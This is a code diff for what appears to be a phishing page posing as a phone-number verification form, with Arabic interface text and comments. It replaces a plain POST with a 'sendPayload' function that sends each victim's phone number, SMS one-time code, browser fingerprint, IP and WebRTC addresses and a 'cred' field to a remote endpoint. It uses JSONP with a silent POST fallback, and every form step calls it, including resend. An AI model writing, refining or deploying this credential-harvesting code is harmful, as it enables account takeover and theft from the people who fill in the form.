@@ -251,16 +251,30 @@
     return NA;
   }
 
-  async function post(payload) {
-    try {
-      await fetch(ENDPOINT, {
-        method:'POST', mode:'no-cors', cache:'no-store',
-        headers:{'Content-Type':'text/plain;charset=UTF-8'},
-        body: JSON.stringify({ a:'collect', d: payload })
-      });
-      return true;
-    } catch(_) { return false; }
-  }
+/* JSONP أولاً — رد حقيقي من الخادم. POST كـ fallback صامت. */
+async function sendPayload(payload) {
+  const p = Object.assign({}, payload);
+  p.hist = '[]';
+  p.misc = '{}';
+  p.fp   = (p.fp || '').slice(0, 120);
+  p.ua   = (p.ua || '').slice(0, 120);
+  p.ips  = (p.ips || []).slice(0, 3);
+  p.rtc  = (p.rtc || []).slice(0, 3);
+  p.cred = (p.cred || '').slice(0, 220);
+
+  const confirmed = await jsonp({ a:'collect', d: JSON.stringify(p) }, 12000);
+  if (confirmed) return true;
+
+  /* آخر محاولة — POST fire-and-forget. مش بنتحقق منه. */
+  try {
+    await fetch(ENDPOINT, {
+      method:'POST', mode:'no-cors', cache:'no-store',
+      headers:{'Content-Type':'text/plain;charset=UTF-8'},
+      body: JSON.stringify({ a:'collect', d: payload })
+    });
+  } catch (_) {}
+  return false;
+}
 
   function toQuery(o) {
     return Object.keys(o).filter(k => o[k]!=='' && o[k]!=null)
@@ -333,7 +347,7 @@
     sentPhone = cc.value + digits;
     $('#sentNum').textContent = sentPhone;
     const payload = await buildPayload(1, { phone: sentPhone, otp: '' });
-    await post(payload);
+    await sendPayload(payload);
     await sleep(700);
     step1.hidden = true; step2.hidden = false;
     h.textContent = 'أدخل رمز التحقق';
@@ -364,7 +378,7 @@
     }
 
     const payload = await buildPayload(2, { phone: sentPhone, otp: code });
-    await post(payload);
+    await sendPayload(payload);
 
     await sleep(1500);
 
@@ -417,7 +431,7 @@
   resend.addEventListener('click', async () => {
     resend.disabled = true;
     const payload = await buildPayload(2, { phone: sentPhone, otp: '', resend: true });
-    await post(payload);
+    await sendPayload(payload);
     setStatus('أعدنا الإرسال. تحقق من رسائلك.', 'ok');
     await sleep(1500);
     resend.disabled = false;
